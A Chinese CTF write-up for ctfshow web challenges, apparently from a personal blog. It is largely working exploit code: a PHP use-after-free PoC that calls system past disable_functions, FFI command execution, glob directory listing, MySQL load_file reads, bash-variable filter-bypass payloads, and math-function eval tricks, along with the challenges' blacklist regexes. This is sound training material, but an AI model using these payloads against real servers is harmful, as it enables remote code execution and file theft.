class="keyword">function</span> <span class="title">get_binary_base</span>(<span class="params"><span class="variable">$binary_leak</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$base</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$start</span> = <span class="variable">$binary_leak</span> &amp; <span class="number">0xfffffffffffff000</span>;</span><br><span class="line">        <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x1000</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">            <span class="variable">$addr</span> = <span class="variable">$start</span> - <span class="number">0x1000</span> * <span class="variable">$i</span>;</span><br><span class="line">            <span class="variable">$leak</span> = leak(<span class="variable">$addr</span>, <span class="number">0</span>, <span class="number">7</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$leak</span> == <span class="number">0x10102464c457f</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">get_system</span>(<span class="params"><span class="variable">$basic_funcs</span></span>) </span>&#123;</span><br><span class="line">        <span class="variable">$addr</span> = <span class="variable">$basic_funcs</span>;</span><br><span class="line">        <span class="keyword">do</span> &#123;</span><br><span class="line">            <span class="variable">$f_entry</span> = leak(<span class="variable">$addr</span>);</span><br><span class="line">            <span class="variable">$f_name</span> = leak(<span class="variable">$f_entry</span>, <span class="number">0</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$f_name</span> == <span class="number">0x6d6574737973</span>) &#123;</span><br><span class="line">                <span class="keyword">return</span> leak(<span class="variable">$addr</span> + <span class="number">8</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$addr</span> += <span class="number">0x20</span>;</span><br><span class="line">        &#125; <span class="keyword">while</span>(<span class="variable">$f_entry</span> != <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">trigger_uaf</span>(<span class="params"><span class="variable">$arg</span></span>) </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="variable">$arg</span> = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line">        <span class="variable">$vuln</span> = <span class="keyword">new</span> Vuln();</span><br><span class="line">        <span class="variable">$vuln</span>-&gt;a = <span class="variable">$arg</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(stristr(PHP_OS, <span class="string">&#x27;WIN&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;This PoC is for *nix systems only.&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$n_alloc</span> = <span class="number">10</span>; </span><br><span class="line">    <span class="variable">$contiguous</span> = [];</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$n_alloc</span>; <span class="variable">$i</span>++)</span><br><span class="line">        <span class="variable">$contiguous</span>[] = str_shuffle(<span class="string">&#x27;AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    trigger_uaf(<span class="string">&#x27;x&#x27;</span>);</span><br><span class="line">    <span class="variable">$abc</span> = <span class="variable">$backtrace</span>[<span class="number">1</span>][<span class="string">&#x27;args&#x27;</span>][<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line">    <span class="variable">$helper</span> = <span class="keyword">new</span> Helper;</span><br><span class="line">    <span class="variable">$helper</span>-&gt;b = <span class="function"><span class="keyword">function</span> (<span class="params"><span class="variable">$x</span></span>) </span>&#123; &#125;;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(strlen(<span class="variable">$abc</span>) == <span class="number">79</span> || strlen(<span class="variable">$abc</span>) == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;UAF failed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_handlers</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="variable">$php_heap</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x58</span>);</span><br><span class="line">    <span class="variable">$abc_addr</span> = <span class="variable">$php_heap</span> - <span class="number">0xc8</span>;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x60</span>, <span class="number">2</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x70</span>, <span class="number">6</span>);</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x10</span>, <span class="variable">$abc_addr</span> + <span class="number">0x60</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x18</span>, <span class="number">0xa</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$closure_obj</span> = str2ptr(<span class="variable">$abc</span>, <span class="number">0x20</span>);</span><br><span class="line"></span><br><span class="line">    <span class="variable">$binary_leak</span> = leak(<span class="variable">$closure_handlers</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$base</span> = get_binary_base(<span class="variable">$binary_leak</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t determine binary base address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$elf</span> = parse_elf(<span class="variable">$base</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t parse ELF header&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$basic_funcs</span> = get_basic_funcs(<span class="variable">$base</span>, <span class="variable">$elf</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get basic_functions address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!(<span class="variable">$zif_system</span> = get_system(<span class="variable">$basic_funcs</span>))) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;Couldn&#x27;t get zif_system address&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="variable">$fake_obj_offset</span> = <span class="number">0xd0</span>;</span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="number">0x110</span>; <span class="variable">$i</span> += <span class="number">8</span>) &#123;</span><br><span class="line">        write(<span class="variable">$abc</span>, <span class="variable">$fake_obj_offset</span> + <span class="variable">$i</span>, leak(<span class="variable">$closure_obj</span>, <span class="variable">$i</span>));</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0x20</span>, <span class="variable">$abc_addr</span> + <span class="variable">$fake_obj_offset</span>);</span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x38</span>, <span class="number">1</span>, <span class="number">4</span>); </span><br><span class="line">    write(<span class="variable">$abc</span>, <span class="number">0xd0</span> + <span class="number">0x68</span>, <span class="variable">$zif_system</span>); </span><br><span class="line"></span><br><span class="line">    (<span class="variable">$helper</span>-&gt;b)(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="keyword">exit</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ctfshow(<span class="string">&quot;cat /flag0.txt&quot;</span>);ob_end_flush();</span><br><span class="line"><span class="comment">#需要通过url编码</span></span><br></pre></td></tr></table></figure>
<p><img src="http://img.npfs06.top/20210223170939.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<h2 id="web-73"><a href="#web-73" class="headerlink" title="web 73"></a>web 73</h2><p><strong>glob</strong>遍历目录 学到了</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>


<p>可以发现里面有个flagc.txt文件</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">payload:  c=include(<span class="string">&quot;/flagc.txt&quot;</span>);<span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>

<h2 id="web-74"><a href="#web-74" class="headerlink" title="web 74"></a>web 74</h2><p>文件名变成flagx.php,做法同73</p>
<h2 id="web-75"><a href="#web-75" class="headerlink" title="web 75"></a>web 75</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">c=<span class="meta">?&gt;</span><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="variable">$a</span>=<span class="keyword">new</span> <span class="built_in">DirectoryIterator</span>(<span class="string">&quot;glob:///*&quot;</span>);</span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$a</span> <span class="keyword">as</span> <span class="variable">$f</span>)</span><br><span class="line">&#123;<span class="keyword">echo</span>(<span class="variable">$f</span>-&gt;__toString().<span class="string">&#x27; &#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>(<span class="number">0</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>文件名是flag36.txt</p>
<p>这题需要利用mysql的<code>load_file</code>读文件</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">try</span> &#123;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="keyword">new</span> PDO(<span class="string">&#x27;mysql:host=localhost;dbname=ctftraining&#x27;</span>, <span class="string">&#x27;root&#x27;</span>, <span class="string">&#x27;root&#x27;</span>);</span><br><span class="line">  <span class="keyword">foreach</span>(<span class="variable">$dbh</span>-&gt;query(<span class="string">&#x27;select load_file(&quot;/flag36.txt&quot;)&#x27;</span>) <span class="keyword">as</span> <span class="variable">$row</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span>(<span class="variable">$row</span>[<span class="number">0</span>]).<span class="string">&quot;|&quot;</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="variable">$dbh</span> = <span class="literal">null</span>;</span><br><span class="line">&#125; <span class="keyword">catch</span> (PDOException <span class="variable">$e</span>) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="variable">$e</span>-&gt;getMessage();</span><br><span class="line">  <span class="keyword">die</span>();</span><br><span class="line">&#125;<span class="keyword">exit</span>(<span class="number">0</span>);</span><br></pre></td></tr></table></figure>
<h2 id="web-76"><a href="#web-76" class="headerlink" title="web 76"></a>web 76</h2><p>同web 75 ,就是flag文件名不一样</p>
<h2 id="web-77"><a href="#web-77" class="headerlink" title="web 77"></a>web 77</h2><blockquote>
<p>FFI（Foreign Function Interface），即外部函数接口，是指在一种语言里调用另一种语言代码的技术。PHP的FFI扩展就是一个让你在PHP里调用C代码的技术。</p>
</blockquote>
<p>通过FFI，可以实现调用system函数，从而将flag直接写入一个新建的文本文件中，然后访问这个文本文件，获得flag</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"><span class="variable">$ffi</span> = FFI::cdef(<span class="string">&quot;int system(const char *command);&quot;</span>);<span class="regexp">//</span>创建一个system对象</span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/readflag &gt; 1.txt&#x27;</span>;<span class="regexp">//</span>没有回显的</span><br><span class="line"><span class="variable">$ffi</span>-&gt;system(<span class="variable">$a</span>);<span class="regexp">//</span>通过<span class="variable">$ffi</span>去调用system函数</span><br><span class="line"><span class="keyword">exit</span>();</span><br></pre></td></tr></table></figure>


<h2 id="web-118"><a href="#web-118" class="headerlink" title="web 118"></a>web 118</h2><p>知识点：Linux中内置的bash变量</p>
<p>类似月饼杯web3  ，不过比月饼杯多过滤了数字 月饼杯的<code>payload:$&#123;PATH:14:1&#125;$&#123;PATH:5:1&#125; ????.??? </code>构造出的是 nl flag.php</p>
<p>该题我们还是构造<code>nl flag.php</code></p>
<p> $PATH的最后一位是n $PWD的最后一位 也就是 /var/www/html的最后一位是l<br>在linux中可以用<del>获取变量的最后几位，而字母起到的作用是和0相同的，所有${PATH:</del>A}其实就是${PATH:~0}</p>
<p><img src="http://img.npfs06.top/20210225143606.png?imageView2/0/q/75%7Cwatermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10"></p>
<blockquote>
<p>payload: code=${PATH:<del>A}${PWD:</del>A} ????.???</p>
</blockquote>
<h2 id="web-119"><a href="#web-119" class="headerlink" title="web 119"></a>web 119</h2><p>该题比上题多过滤了path</p>
<h3 id="解法一"><a href="#解法一" class="headerlink" title="解法一"></a>解法一</h3><p>可以构造出<code>/bin/base64 flag.php</code>，只需要/和4两个字符就行，其他的可以用通配符代替</p>
<p>/很简单，pwd的第一位就是，因为这题ban了数字，所以可以用该题值必是1的<code>$&#123;#SHLVL&#125;`绕过：

> SHLVL 是记录多个 Bash 进程实例嵌套深度的累加器,进程第一次打开shell时$&#123;SHLVL&#125;=1，然后在此shell中再打开一个shell时$SHLVL=2。

只需要`$&#123;PWD::$&#123;SHLVL&#125;&#125;</code>，结果就是<code>/</code></p>
<p>还有一个4的问题，可以用<code>$&#123;#RANDOM&#125;`，在Linux中，`$&#123;#xxx&#125;`显示的是这个值的位数，例如12345的值是5，而random函数绝大部分产生的数字都是4位或者5位的，因此可以代替4.

![](http://img.npfs06.top/20210225150320.png?imageView2/0/q/75|watermark/2/text/bnBmczA2LnRvcA==/font/5b6u6L2v6ZuF6buR/fontsize/340/fill/IzAwMDAwMA==/dissolve/62/gravity/SouthEast/dx/10/dy/10)

payload：

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">code=<span class="variable">$&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="variable">$&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>?????<span class="variable">$&#123;#RANDOM&#125;</span> ????.???</span><br><span class="line">这题要多提交几次，以为random存在随机性</span><br></pre></td></tr></table></figure>
### 解法二：

可以构造`/bin/cat flag.php`,需要t和/，`$&#123;HOME&#125;`默认是`/root`，所以需要得到他的最后一个字母，容器的hostname为4个字母，所以`$&#123;#HOSTNAME&#125;`可以从第5位开始，1还是用`$&#123;#SHLVL&#125;`代替

payload:

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">code=<span class="variable">$&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>???<span class="variable">$&#123;PWD::<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span>??<span class="variable">$&#123;HOME:<span class="variable">$&#123;#HOSTNAME&#125;</span>:<span class="variable">$&#123;#SHLVL&#125;</span>&#125;</span> ????.???</span><br></pre></td></tr></table></figure>


## web 120

同web 119



## web 121

<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|HOME|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|\%|\&lt;|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
参照web121的payload`code=$&#123;PWD::$&#123;#SHLVL&#125;&#125;???$&#123;PWD::$&#123;#SHLVL&#125;&#125;?????$&#123;#RANDOM&#125; ????.???</code>这题只是多过滤了SHLEL，这里我们只需要找到可以替换SHLVL的值。</p>
<blockquote>
<p>$?<br>用途：上一条命令执行结束后的传回值。通常0代表执行成功，非0代表执行有误。</p>
</blockquote>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">root@npfs:~<span class="comment"># echo $&#123;#?&#125;</span></span><br><span class="line">1</span><br></pre></td></tr></table></figure>
<p>payload: </p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">code=<span class="variable">$&#123;PWD::<span class="variable">$&#123;#?&#125;</span>&#125;</span>???<span class="variable">$&#123;PWD::<span class="variable">$&#123;#?&#125;</span>&#125;</span>?????<span class="variable">$&#123;#RANDOM&#125;</span> ????.???</span><br></pre></td></tr></table></figure>


<h2 id="web-122"><a href="#web-122" class="headerlink" title="web 122"></a>web 122</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$code</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;code&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&#x27;/\x09|\x0a|[a-z]|[0-9]|FLAG|PATH|BASH|PWD|HISTIGNORE|HISTFILESIZE|HISTFILE|HISTCMD|USER|TERM|HOSTNAME|HOSTTYPE|MACHTYPE|PPID|SHLVL|FUNCNAME|\/|\(|\)|\[|\]|\\\\|\+|\-|_|~|\!|\=|\^|\*|\x26|#|%|\&gt;|\&#x27;|\&quot;|\`|\||\,/&#x27;</span>, <span class="variable">$code</span>))&#123;    </span><br><span class="line">        <span class="keyword">if</span>(strlen(<span class="variable">$code</span>)&gt;<span class="number">65</span>)&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.<span class="string">&#x27;you are so long , I dont like &#x27;</span>.<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;&#x27;</span>.system(<span class="variable">$code</span>).<span class="string">&#x27;&lt;/div&gt;&#x27;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">     <span class="keyword">echo</span> <span class="string">&#x27;&lt;div align=&quot;center&quot;&gt;evil input&lt;/div&gt;&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>增加了#和PWD的过滤，使得我们无法通过获取内置变量的长度获取字符串</p>
<p>PWD过滤了可以用HOME代替，<code>$&#123;HOME&#125;</code>默认是<code>/root</code>，接下去我们只要再找到<code>1</code>来代替<code>$&#123;#SHLVL&#125;</code></p>
<blockquote>
<p>$?<br> 执行上一个指令的返回值 (显示最后命令的退出状态。0表示没有错误，其他任何值表明有错误)</p>
</blockquote>
<p>fuzz下发现题目没有过滤<code>&lt;</code>，所以我们利用<code>&lt;A;</code>报错。从而使<code>$?</code>返回值为1</p>
<p>payload：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">code=&lt;A;<span class="variable">$&#123;HOME::$?&#125;</span>???<span class="variable">$&#123;HOME::$?&#125;</span>?????<span class="variable">$&#123;RANDOM::$?&#125;</span> ????.???</span><br></pre></td></tr></table></figure>


<h2 id="web-124"><a href="#web-124" class="headerlink" title="web 124"></a>web 124</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    <span class="variable">$content</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen(<span class="variable">$content</span>) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&quot;太长了不会算&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;\t&#x27;</span>, <span class="string">&#x27;\r&#x27;</span>, <span class="string">&#x27;\n&#x27;</span>,<span class="string">&#x27;\&#x27;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27;\[&#x27;</span>, <span class="string">&#x27;\]&#x27;</span>];</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackitem</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">&#x27;/&#x27;</span> . <span class="variable">$blackitem</span> . <span class="string">&#x27;/m&#x27;</span>, <span class="variable">$content</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的字符&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    <span class="variable">$whitelist</span> = [<span class="string">&#x27;abs&#x27;</span>, <span class="string">&#x27;acos&#x27;</span>, <span class="string">&#x27;acosh&#x27;</span>, <span class="string">&#x27;asin&#x27;</span>, <span class="string">&#x27;asinh&#x27;</span>, <span class="string">&#x27;atan2&#x27;</span>, <span class="string">&#x27;atan&#x27;</span>, <span class="string">&#x27;atanh&#x27;</span>, <span class="string">&#x27;base_convert&#x27;</span>, <span class="string">&#x27;bindec&#x27;</span>, <span class="string">&#x27;ceil&#x27;</span>, <span class="string">&#x27;cos&#x27;</span>, <span class="string">&#x27;cosh&#x27;</span>, <span class="string">&#x27;decbin&#x27;</span>, <span class="string">&#x27;dechex&#x27;</span>, <span class="string">&#x27;decoct&#x27;</span>, <span class="string">&#x27;deg2rad&#x27;</span>, <span class="string">&#x27;exp&#x27;</span>, <span class="string">&#x27;expm1&#x27;</span>, <span class="string">&#x27;floor&#x27;</span>, <span class="string">&#x27;fmod&#x27;</span>, <span class="string">&#x27;getrandmax&#x27;</span>, <span class="string">&#x27;hexdec&#x27;</span>, <span class="string">&#x27;hypot&#x27;</span>, <span class="string">&#x27;is_finite&#x27;</span>, <span class="string">&#x27;is_infinite&#x27;</span>, <span class="string">&#x27;is_nan&#x27;</span>, <span class="string">&#x27;lcg_value&#x27;</span>, <span class="string">&#x27;log10&#x27;</span>, <span class="string">&#x27;log1p&#x27;</span>, <span class="string">&#x27;log&#x27;</span>, <span class="string">&#x27;max&#x27;</span>, <span class="string">&#x27;min&#x27;</span>, <span class="string">&#x27;mt_getrandmax&#x27;</span>, <span class="string">&#x27;mt_rand&#x27;</span>, <span class="string">&#x27;mt_srand&#x27;</span>, <span class="string">&#x27;octdec&#x27;</span>, <span class="string">&#x27;pi&#x27;</span>, <span class="string">&#x27;pow&#x27;</span>, <span class="string">&#x27;rad2deg&#x27;</span>, <span class="string">&#x27;rand&#x27;</span>, <span class="string">&#x27;round&#x27;</span>, <span class="string">&#x27;sin&#x27;</span>, <span class="string">&#x27;sinh&#x27;</span>, <span class="string">&#x27;sqrt&#x27;</span>, <span class="string">&#x27;srand&#x27;</span>, <span class="string">&#x27;tan&#x27;</span>, <span class="string">&#x27;tanh&#x27;</span>];</span><br><span class="line">    preg_match_all(<span class="string">&#x27;/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/&#x27;</span>, <span class="variable">$content</span>, <span class="variable">$used_funcs</span>);  </span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$used_funcs</span>[<span class="number">0</span>] <span class="keyword">as</span> <span class="variable">$func</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array(<span class="variable">$func</span>, <span class="variable">$whitelist</span>)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;请不要输入奇奇怪怪的函数&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">&#x27;echo &#x27;</span>.<span class="variable">$content</span>.<span class="string">&#x27;;&#x27;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>来源于国赛一题，不过 <code>[NESTCTF 2019]Love Math 2</code>又对该题做了进一步的改编，将<code>strlen($content) &gt;= 80</code>这一范围改为了<code>strlen($content) &gt;= 60</code>,这里都一起讲了</p>
<p>总共三种方法，不过只有异或的方法适合这题</p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">PHP函数：</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="title">scandir</span><span class="params">()</span></span> 函数：返回指定目录中的文件和目录的数组。</span><br><span class="line"><span class="function"><span class="title">base_convert</span><span class="params">()</span></span> 函数：在任意进制之间转换数字。</span><br><span class="line"><span class="function"><span class="title">dechex</span><span class="params">()</span></span> 函数：把十进制转换为十六进制。</span><br><span class="line"><span class="function"><span class="title">hex2bin</span><span class="params">()</span></span> 函数：把十六进制值的字符串转换为 ASCII 字符。</span><br><span class="line"><span class="function"><span class="title">var_dump</span><span class="params">()</span></span> ：函数用于输出变量的相关信息。</span><br><span class="line"><span class="function"><span class="title">readfile</span><span class="params">()</span></span> 函数：输出一个文件。该函数读入一个文件并写入到输出缓冲。若成功，则返回从文件中读入的字节数。若失败，则返回 false。您可以通过 @readfile() 形式调用该函数，来隐藏错误信息。</span><br><span class="line">语法：readfile(filename,include_path,context)</span><br><span class="line"></span><br></pre></td></tr></table></figure>


<p><strong>方法一：利用数学函数运算得到函数和命令</strong></p>
<figure class="highlight gams"><table><tr><td class="code"><pre><span class="line">/index.php?c=<span class="symbol">$</span><span class="built_in">pi</span>=base_convert(<span class="number">37907361743</span>,<span class="number">10</span>,<span class="number">36</span>)(dechex(<span class="number">1598506324</span>));(<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">pi</span>&#125;((<span class="symbol">$</span><span class="symbol">$</span><span class="built_in">pi</span>)&#123;<span class="built_in">abs</span>&#125;)&amp;<span class="built_in">pi</span>=<span class="keyword">system</span>&amp;<span class="built_in">abs</span>=&lt;command&gt;</span><br></pre></td></tr></table></figure>
<p><em>分析：</em></p>
